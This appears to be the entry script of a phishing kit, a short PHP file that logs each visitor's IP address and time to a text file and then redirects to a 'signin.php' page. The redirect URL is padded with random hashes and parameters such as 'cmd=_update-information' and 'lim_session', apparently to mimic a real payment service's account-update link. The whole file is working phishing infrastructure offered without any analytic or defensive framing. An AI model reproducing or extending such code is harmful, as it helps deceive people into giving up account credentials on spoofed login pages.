<?php

$IP = $_SERVER['REMOTE_ADDR'];
$F  = fopen("../visitors.txt", "a");
fwrite($F, "IP : " . $IP . " || " . gmdate("Y-n-d") . " + " . gmdate("H:i:s") . "\n\n");

 
$A = "signin.php?cmd=_update-information&account_update=" . md5(microtime()) . "&lim_session=" . sha1(microtime()) . "";
header("location:$A");
?>